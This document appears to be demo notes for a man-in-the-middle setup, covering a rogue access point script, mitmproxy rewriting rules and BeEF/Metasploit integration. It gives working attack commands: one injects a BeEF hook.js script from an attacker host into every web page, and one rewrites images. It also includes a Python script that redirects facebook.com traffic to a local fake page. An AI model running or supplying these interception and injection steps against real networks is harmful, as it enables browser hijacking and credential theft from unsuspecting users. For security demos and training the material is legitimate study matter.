

# Man-in-the-Middle Demo's
# NOT FOR MUSTARD
## NOTE:

* Kali and Ubuntu differ in that wlan1 becomes mon0 on Kali and wlan1mon on Ubuntu

### General.

In these `instructions` we will outline a number of demos that can be run by setting up a *man-in-the-middle* network.


### Setting up the network.

We have created two scripts that we need for this demo:
`start_accesspoint.sh` and `stop_accesspoint.sh`. Obviously, when closing the network we need to run the `stop_accesspoint.sh` script to make sure all settings are set back.

To start the network we need to run the `start_accesspoint.sh` script as the super-user. 

~~~bash
$ su
Password: *
~~~

We also need 3 inputs for the script to generate the network: (1) `<GATEWAY>` is the *gateway ip-address* of the network you are currently on. 

~~~bash
$ route -n


# On a MacOSX
$ route -n get default
   route to: default
destination: default
       mask: default
    gateway: 172.16.1.1
  interface: en0
      flags: <UP,GATEWAY,DONE,STATIC,PRCLONING>
 recvpipe  sendpipe  ssthresh  rtt,msec    rttvar  hopcount      mtu     expire
       0         0         0         0         0         0      1500         0
~~~

Input (2) `<INTERNET-DEVICE>` is the *device that the laptop uses to connect to the internet externally*. Make sure this is either `wlan0` or `eth0` (if you are connected via ethernet).

~~~bash
$ ./start_accesspoint.sh <GATEWAY> <INTERNET-DEVICE> "<NETWORK NAME>"
~~~

To stop use `CTRL-C`

~~~bash
$ ./stop_accesspoint.sh
~~~


### Man-in-the-middle Proxy

First we need to enter the virtual environment to be able run the `mitmproxy` scripts.

~~~bash
$ cd Desktop/tmp
$ . env/bin/activate
~~~

To replace every image on a page with another image use the following line

~~~bash
$ mitmproxy -T --host --replace :~hq~s:"<img\s[^>]*?src\s*=\s*['\"]([^'\"]*?)['\"][^>]*?>":"<img src=\"XXXX-URL-TO-IMAGE-XXXX\">"
~~~

it basically matches a regex and replaces the `img` tag with a new one. This clearly does not work for css-driven image placements.

Injecting code into other webpages.

~~~bash
$ mitmproxy -T --host --replace :~hq~s:"<head>":"<head><script src=\"http://192.168.1.XX:3000/hook.js\" type=\"text/javascript\"></script>"
~~~

this will inject the `beef-hook` into pages.

~~~bash
$ mitmproxy -T --host -s scripts-mitm/redirect_request.py
~~~

This file looks a bit as follows

~~~python
from libmproxy.protocol.http import HTTPResponse
from netlib.odict import ODictCaseless

def request( context, flow ):
	# Get the hostname.
	flower = flow.request.pretty_host(hostheader=True)
	print "\tRequested domain: {}".format( flower )
	# Redirect
	if flower.endswith("facebook.com"):
		flow.request.host = "localhost"
		flow.request.port = 9999
		flow.request.path = "facebook.html"
		flow.request.update_host_header()
~~~

## Setting up metasploit with beef

* All works, except the metasploit web UI - I seem to have damaged the database somehow.
* http://samiux.blogspot.hk/2013/05/howto-beef-and-metasploit-integration.html - great link
